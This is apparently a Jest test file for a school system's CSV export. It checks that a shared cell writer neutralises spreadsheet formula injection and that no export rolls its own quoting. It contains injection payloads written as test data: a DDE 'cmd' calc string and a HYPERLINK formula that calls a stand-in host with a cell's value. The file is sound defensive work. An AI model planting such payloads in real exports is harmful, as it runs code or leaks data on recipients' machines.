// =============================================================================
// Nine copies of a security control, and the tenth export that never got one
// =============================================================================
// A spreadsheet treats a cell beginning `=`, `+`, `-` or `@` as a FORMULA, and
// quoting does not stop it — `"=HYPERLINK(...)"` is still evaluated on open. So
// a name typed into this system can become code running on the machine of
// whoever downloads the register (OWASP: CSV injection).
//
// The guard existed NINE times under four names — `csvCell` in admin, group,
// fee-ops, timetable and platform-audit; `esc` in analytics, payroll (twice)
// and library; `cell` in operator-payments. Every copy was correct.
//
// The class register had no copy at all. It built its rows inline, quoting the
// name by hand and interpolating the email raw. Proven against the running
// system by renaming one pupil and downloading two exports:
//
//   students.csv   "1","'=HYPERLINK(""http://x/""&A1,""clickme"")","VOL SS2 C"
//   roster.csv     1,"=HYPERLINK(""http://x/""&A1,""clickme"")",vol.s283@…
//
// Same pupil, same name: the admin export neutralises it, the class register
// hands a live formula to whichever teacher opens the file. That is what nine
// copies buy — not one of them wrong, and the place that needed it most simply
// never got one.
// =============================================================================

import { readFileSync, readdirSync, statSync } from "node:fs";
import { join } from "node:path";
import { csvCell, csvRow, csvDocument } from "../../src/common/csv";

describe("the cell writer", () => {
  it.each(["=cmd|' /c calc'!A0", "+1+1", "-2+3", "@SUM(A1)"])(
    "neutralises a leading formula character: %s",
    (value) => {
      expect(csvCell(value)).toBe(`"'${value}"`);
    },
  );

  it("neutralises a leading tab or carriage return, which are invisible", () => {
    expect(csvCell("\t=cmd")).toBe(`"'\t=cmd"`);
    expect(csvCell("\r=cmd")).toBe(`"'\r=cmd"`);
  });

  it("leaves an ordinary name alone apart from quoting", () => {
    expect(csvCell("Ada Lovelace")).toBe('"Ada Lovelace"');
    // A hyphen INSIDE a name is not a leading one.
    expect(csvCell("Ngozi Ekwueme-Ike")).toBe('"Ngozi Ekwueme-Ike"');
  });

  it("escapes embedded quotes so a name cannot break out of its cell", () => {
    expect(csvCell('Ada "Countess" Lovelace')).toBe('"Ada ""Countess"" Lovelace"');
  });

  it("keeps a comma inside one cell", () => {
    expect(csvRow(["Lovelace, Ada", "SS2"])).toBe('"Lovelace, Ada","SS2"');
  });

  it("writes a blank rather than the word null", () => {
    expect(csvCell(null)).toBe('""');
    expect(csvCell(undefined)).toBe('""');
  });

  it("handles numbers, which every export has", () => {
    expect(csvCell(0)).toBe('"0"');
    expect(csvCell(1_234)).toBe('"1234"');
  });

  it("ends a document with a newline", () => {
    // Without one, concatenating two exports welds the last row to the first.
    expect(csvDocument(["a"], [["b"]])).toBe('"a"\n"b"\n');
  });
});

describe("the class register, which had no guard", () => {
  const SRC = readFileSync(join(__dirname, "../../src/lms/lms.controller.ts"), "utf8");
  const at = SRC.indexOf("async rosterCsv");
  const body = SRC.slice(at, SRC.indexOf("\n  }", at));

  it("builds its rows with the shared writer", () => {
    expect(body).toMatch(/csvDocument\(/);
  });

  it("no longer hand-quotes the name or interpolates the email raw", () => {
    expect(body).not.toMatch(/replace\(\/"\/g/);
    expect(body).not.toMatch(/\$\{s\.email\}/);
  });
});

describe("one definition, so the tenth cannot go missing again", () => {
  const API = join(__dirname, "../..");

  function walk(dir: string, out: string[] = []): string[] {
    for (const e of readdirSync(join(API, dir))) {
      const rel = `${dir}/${e}`;
      if (statSync(join(API, rel)).isDirectory()) walk(rel, out);
      else if (e.endsWith(".ts")) out.push(rel);
    }
    return out;
  }

  it("scanned something — this gate can otherwise pass by finding nothing", () => {
    // THE FAILURE EVERY SOURCE-SCANNING GATE SHARES. The check above asserts an
    // EMPTY offender list, so a walk that returns no files passes with a green
    // tick while covering nothing at all — a moved directory, a changed
    // extension, a renamed root. Demonstrated on this repo by pointing one
    // gate's walk at a directory holding no `.ts` files: every assertion still
    // passed. The magnitude is the only thing that can tell "clean" from "blind".
    expect(walk("src").length).toBeGreaterThan(100);
  });

  it("no file rolls its own formula guard", () => {
    // The tell is the character class every copy used. If a new export needs
    // this, it imports it — that is the whole point of the file it lives in.
    const offenders = walk("src").filter((f) => {
      if (f === "src/common/csv.ts") return false;
      return /\^\[=\+\\?-@/.test(readFileSync(join(API, f), "utf8"));
    });
    expect(offenders).toEqual([]);
  });

  it("nothing that serves a CSV hand-rolls its quoting", () => {
    // The exact tell of the register's hole: escaping a quote by hand instead
    // of calling the writer. Deliberately narrow — a first attempt at this
    // flagged a static template, a notification message and a FILENAME, and a
    // check that cries wolf is one the next person deletes.
    const offenders = walk("src").filter((f) => {
      if (f === "src/common/csv.ts") return false;
      const src = readFileSync(join(API, f), "utf8");
      if (!/text\/csv|csvCell|csvDocument/.test(src)) return false;
      // The CSV convention specifically: DOUBLING a quote. Analytics quotes a
      // SQL identifier with `replace(/"/g, "")` — stripping, not doubling —
      // which is a different job and must not be flagged.
      return /replace\(\/"\/g,\s*['"`]""/.test(src.replace(/\/\*[\s\S]*?\*\/|\/\/[^\n]*/g, ""));
    });
    expect(offenders).toEqual([]);
  });
});
